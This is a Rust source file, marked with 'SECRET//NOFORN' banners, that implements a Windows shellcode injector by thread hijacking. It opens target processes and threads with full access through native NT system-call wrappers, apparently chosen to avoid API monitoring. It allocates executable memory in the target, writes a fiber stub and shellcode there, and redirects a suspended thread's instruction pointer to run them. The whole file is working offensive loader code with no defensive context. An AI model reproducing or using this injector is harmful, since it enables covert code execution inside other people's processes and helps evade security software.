/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/

use std::ffi::c_void;
use windows::{
    core::Result,
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        System::{
            Diagnostics::Debug::{CONTEXT, CONTEXT_FLAGS, FlushInstructionCache},
        },
        UI::WindowsAndMessaging::{PostThreadMessageA, WM_NULL},
    },
};
use crate::missed_calls;
use crate::def::ClientId;
use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
use std::ptr::null_mut;
use std::mem::size_of;

// CONTEXT flags constant (CONTEXT_FULL)
const CONTEXT_ALL: CONTEXT_FLAGS = CONTEXT_FLAGS(0x0010001F);

// open handle to target proc with full access
pub unsafe fn open_target_process(pid: u32) -> Result<HANDLE> {
    let mut h_process: winapi::shared::ntdef::HANDLE = null_mut();
    let mut client_id = ClientId {
        unique_process: pid as usize as *mut std::ffi::c_void,
        unique_thread: null_mut(),
    };
    let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
    oa.Length = size_of::<OBJECT_ATTRIBUTES>() as u32;

    let status = missed_calls::nt_open_process(
        &mut h_process,
        windows::Win32::System::Threading::PROCESS_ALL_ACCESS.0, // ACCESS_MASK is u32 in winapi
        &mut oa,
        &mut client_id
    );

    if status != 0 {
        return Err(windows::core::Error::from_thread());
    }

    Ok(HANDLE(h_process as *mut std::ffi::c_void))
}

// open handle to target thread with full access
pub unsafe fn open_target_thread(thread_id: u32) -> Result<HANDLE> {
    let mut h_thread: winapi::shared::ntdef::HANDLE = null_mut();
    let mut client_id = ClientId {
        unique_process: null_mut(),
        unique_thread: thread_id as usize as *mut std::ffi::c_void,
    };
    let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
    oa.Length = size_of::<OBJECT_ATTRIBUTES>() as u32;

    let status = missed_calls::nt_open_thread(
        &mut h_thread,
        windows::Win32::System::Threading::THREAD_ALL_ACCESS.0,
        &mut oa,
        &mut client_id
    );

    if status != 0 {
        return Err(windows::core::Error::from_thread());
    }
    Ok(HANDLE(h_thread as *mut std::ffi::c_void))
}

// allocate memory in remote process
pub unsafe fn remote_alloc(h_process: HANDLE, size: usize) -> Result<*mut c_void> {
    let mut base_addr: *mut c_void = null_mut();
    let mut region_size: usize = size;
    let status = missed_calls::nt_allocate_virtual_memory(
        h_process.0 as *mut winapi::ctypes::c_void,
        &mut base_addr as *mut *mut std::ffi::c_void as *mut *mut winapi::ctypes::c_void,
        0,
        &mut region_size,
        windows::Win32::System::Memory::MEM_COMMIT.0 | windows::Win32::System::Memory::MEM_RESERVE.0,
        windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE.0,
    );

    if status != 0 {
        return Err(windows::core::Error::from_thread());
    }

    Ok(base_addr)
}


// write to remote process memory
pub unsafe fn remote_write(h_process: HANDLE, address: *const c_void, data: &[u8]) -> Result<()> {
    let mut bytes_written: usize = 0;
    let status = missed_calls::nt_write_virtual_memory(
        h_process.0 as *mut winapi::ctypes::c_void,
        address as *mut winapi::ctypes::c_void,
        data.as_ptr() as *mut winapi::ctypes::c_void, // cast const to mut
        data.len(),
        &mut bytes_written,
    );
     if status != 0 {
        return Err(windows::core::Error::from_thread());
    }

    Ok(())
}

// suspend remote thread
pub unsafe fn suspend_remote_thread(h_thread: HANDLE) -> Result<u32> {
    let mut prev: u32 = 0;
    let status = missed_calls::nt_suspend_thread(h_thread.0 as *mut winapi::ctypes::c_void, &mut prev);
    if status != 0 {
        return Err(windows::core::Error::from_thread());
    }
    Ok(prev)
}

// resume remote thread
pub unsafe fn resume_remote_thread(h_thread: HANDLE) -> Result<u32> {
    let mut prev: u32 = 0;
    let status = missed_calls::nt_resume_thread(h_thread.0 as *mut winapi::ctypes::c_void, &mut prev);
    if status != 0 {
        return Err(windows::core::Error::from_thread());
    }
    Ok(prev)
}

#[repr(C, align(16))]
pub struct AlignedContext(pub CONTEXT);

// get remote thread context
pub unsafe fn get_remote_thread_context(h_thread: HANDLE) -> Result<AlignedContext> {
    // allocate on heap
    let mut aligned = Box::new(std::mem::MaybeUninit::<AlignedContext>::uninit());
    let ctx_ptr = aligned.as_mut_ptr() as *mut CONTEXT;

    // zero initialize to be safe
    std::ptr::write_bytes(ctx_ptr, 0, 1);

    // set context flags
    (*ctx_ptr).ContextFlags = CONTEXT_ALL;

    // cast windows::CONTEXT to winapi::CONTEXT
    let status = missed_calls::nt_get_context_thread(h_thread.0 as *mut winapi::ctypes::c_void, ctx_ptr as *mut winapi::um::winnt::CONTEXT);
    
    if status != 0 { // NT_SUCCESS(0)
         return Err(windows::core::Error::from_thread());
    }
    Ok(*aligned.assume_init())
}

/// set thread context
pub unsafe fn set_remote_thread_context(h_thread: HANDLE, ctx: &AlignedContext) -> Result<()> {
    // SetThreadContext(h_thread, &ctx.0)
    let ctx_ptr = &ctx.0 as *const CONTEXT as *mut CONTEXT;
    let status = missed_calls::nt_set_context_thread(h_thread.0 as *mut winapi::ctypes::c_void, ctx_ptr as *mut winapi::um::winnt::CONTEXT);
       if status != 0 { // NT_SUCCESS(0)
         return Err(windows::core::Error::from_thread());
    }
    Ok(())
}

pub unsafe fn hijack_thread_with_fiber(
    h_process: HANDLE,
    h_thread: HANDLE,
    shellcode: &[u8],
) -> Result<(*mut c_void, usize)> {
    // load compiled fiber stub
    let fiber_stub: &[u8] = include_bytes!("fiber_stub.bin");

    // calculate padding to align shellcode to 16 bytes
    let stub_len = fiber_stub.len();
    let padding_len = (16 - (stub_len % 16)) % 16;
    let shellcode_offset = stub_len + padding_len;

    // calculate total size needed
    let total_size = shellcode_offset + shellcode.len();

    // allocate memory in remote process
    let remote_mem = remote_alloc(h_process, total_size)?;

    // calculate addresses
    let stub_addr = remote_mem;
    let shellcode_addr = (remote_mem as usize + shellcode_offset) as *mut c_void;

    // write fiber stub to remote memory
    remote_write(h_process, stub_addr, &fiber_stub)?;

    // write shellcode after stub (and padding)
    remote_write(h_process, shellcode_addr, shellcode)?;

    // flush instruction cache to ensure CPU sees new code
    FlushInstructionCache(h_process, Some(remote_mem.cast()), total_size)?;

    // suspend target thread
    suspend_remote_thread(h_thread)?;

    // get current thread context
    let mut ctx_wrapper = get_remote_thread_context(h_thread)?;
    let ctx = &mut ctx_wrapper.0;

    // modify RIP to point to fiber stub
    ctx.Rip = stub_addr as u64;

    // set RDI to point to shellcode
    ctx.Rdi = shellcode_addr as u64;

    // set the modified context
    set_remote_thread_context(h_thread, &ctx_wrapper)?;

    // verify RIP updated
    let verify_ctx = get_remote_thread_context(h_thread)?;

    if verify_ctx.0.Rip != stub_addr as u64 {
        // println!("[-] Did not update.");
    }

    // resume thread - check suspension count
    let mut suspend_count = resume_remote_thread(h_thread)?;

    // if thread is still suspended, force resume
    while suspend_count > 1 {
        suspend_count = resume_remote_thread(h_thread)?;
    }

    // trigger thread wake-up
    use windows::Win32::System::Threading::GetThreadId;
    let tid = GetThreadId(h_thread);
    if tid != 0 {
         let _ = PostThreadMessageA(tid, WM_NULL, windows::Win32::Foundation::WPARAM(0), windows::Win32::Foundation::LPARAM(0));
    }

    Ok((stub_addr, total_size))
}

// close process handle
pub unsafe fn close_process_handle(h_process: HANDLE) -> Result<()> {
    CloseHandle(h_process)
}

// close thread handle
pub unsafe fn close_thread_handle(h_thread: HANDLE) -> Result<()> {
    CloseHandle(h_thread)
}

/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/